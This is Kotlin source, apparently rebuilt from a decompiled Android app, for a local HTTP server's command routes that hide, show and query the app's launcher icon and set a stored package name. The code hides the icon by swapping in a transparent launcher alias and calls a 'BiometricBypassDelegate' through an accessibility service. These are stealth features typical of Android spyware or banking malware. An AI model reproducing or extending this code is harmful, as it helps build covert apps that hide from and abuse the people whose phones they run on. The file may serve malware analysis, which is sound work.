package com.storm.safe.rock.service.modules.routes

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import com.storm.safe.rock.AppVariantF
import com.storm.safe.rock.DefaultLauncherAlias
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.RemoteConfigManager.Companion.getLauncherAliases
import com.storm.safe.rock.service.modules.RemoteConfigManager.Companion.makeErrorResponse
import com.storm.safe.rock.service.modules.RemoteConfigManager.Companion.makeTextResponse
import org.json.JSONObject

/**
 * Icon management route handlers -- /visibility, /hideIcon, /showIcon, /iconStatus,
 * /mainPackageName.
 *
 * Extracted from RemoteConfigManager (JADX: C0322a7).
 * JADX methods: c2, c3, d2, c4, c5.
 */
object IconRouteHandlers {
    private const val TAG = "LocalHttpServer"

    /**
     * /visibility and /hideIcon -- hide launcher icon.
     * JADX: m211612c2 (c2)
     */
    @JvmStatic
    fun visibility(context: Context): JSONObject {
        return try {
            // JADX: try fxsnugkm (BiometricBypassDelegate) first, fall back to visibilityFallback
            val service = MyAccessibilityService.getInstance()
            val delegate = service?.biometricBypassDelegate
            if (delegate == null) {
                Log.w(TAG, "⚠️ fxsnugkm 不可用，使用降级方案")
                return visibilityFallback(context)
            }
            val result = delegate.hideIcon(true)
            Log.d(TAG, "🙈 桌面图标隐藏: ${result.action} - ${result.message}")
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", result.success)
            json.put("msg", result.message)
            json.put("method", result.action)
            json
        } catch (e: Exception) {
            Log.e(TAG, "隐藏图标失败", e)
            makeErrorResponse("隐藏图标失败: ${e.message}")
        }
    }

    /**
     * Fallback icon hide -- disable DefaultLauncherAlias, enable AppVariantF.
     * JADX: m211613c3 (c3)
     */
    @JvmStatic
    fun visibilityFallback(context: Context): JSONObject {
        val pm = context.packageManager
        pm.setComponentEnabledSetting(
            ComponentName(context, DefaultLauncherAlias::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        pm.setComponentEnabledSetting(
            ComponentName(context, AppVariantF::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
        val json = JSONObject()
        json.put("code", 200)
        json.put("success", true)
        json.put("msg", "降级隐藏: 禁用DefaultLauncherAlias + 启用AppVariantF透明入口")
        return json
    }

    /**
     * /showIcon -- re-enable all launcher aliases.
     * JADX: m211620d2 (d2)
     */
    @JvmStatic
    fun showIcon(context: Context): JSONObject {
        return try {
            val pm = context.packageManager
            val aliases = getLauncherAliases()
            val details = mutableListOf<String>()
            var enabledCount = 0
            for (cls in aliases) {
                try {
                    val cn = ComponentName(context, cls)
                    pm.setComponentEnabledSetting(
                        cn,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    val state = pm.getComponentEnabledSetting(cn)
                    val ok = state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED ||
                            state == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT
                    if (ok) enabledCount++
                    details.add("${cls.simpleName}:${if (ok) "✓" else "✗"}")
                } catch (_: Exception) {
                }
            }
            Log.d(TAG, "👁️ 桌面图标显示: $enabledCount/${aliases.size} 组件已启用")
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", true)
            json.put("msg", "图标显示: $enabledCount/${aliases.size} 组件已启用")
            json.put("enabled", enabledCount)
            json.put("total", aliases.size)
            json.put("details", details.joinToString(", "))
            json
        } catch (e: Exception) {
            Log.e(TAG, "显示图标失败", e)
            makeErrorResponse("显示图标失败: ${e.message}")
        }
    }

    /**
     * /iconStatus -- query component enabled states.
     * JADX: m211614c4 (c4)
     */
    @JvmStatic
    fun iconStatus(context: Context): JSONObject {
        return try {
            val pm = context.packageManager
            val aliases = getLauncherAliases()
            val details = mutableListOf<String>()
            var enabledCount = 0
            var disabledCount = 0
            for (cls in aliases) {
                try {
                    val state = pm.getComponentEnabledSetting(
                        ComponentName(context, cls)
                    )
                    val label = when (state) {
                        PackageManager.COMPONENT_ENABLED_STATE_DEFAULT -> {
                            enabledCount++; "default"
                        }
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED -> {
                            enabledCount++; "enabled"
                        }
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED -> {
                            disabledCount++; "disabled"
                        }
                        else -> "unknown"
                    }
                    details.add("${cls.simpleName}:$label")
                } catch (_: Exception) {
                }
            }
            val hidden = disabledCount > 0 && enabledCount == 0
            Log.d(TAG, "📊 图标状态: enabled=$enabledCount, disabled=$disabledCount, hidden=$hidden")
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", true)
            json.put("hidden", hidden)
            json.put("enabled", enabledCount)
            json.put("disabled", disabledCount)
            json.put("total", aliases.size)
            json.put("details", details.joinToString(", "))
            json
        } catch (e: Exception) {
            Log.e(TAG, "查询图标状态失败", e)
            makeErrorResponse("查询图标状态失败: ${e.message}")
        }
    }

    /**
     * /mainPackageName -- set main package name.
     * JADX: m211615c5 (c5)
     */
    @JvmStatic
    fun mainPackageName(context: Context, params: Map<String, String>): JSONObject {
        var packageName = params["package"]
        if (packageName == null) {
            packageName = context.packageName
        }
        Log.d(TAG, "📦 [mainPackageName] package=$packageName")
        context.getSharedPreferences("local_config", 0)
            .edit()
            .putString("main_package", packageName)
            .apply()
        return makeTextResponse("mainPackageName set: $packageName")
    }
}
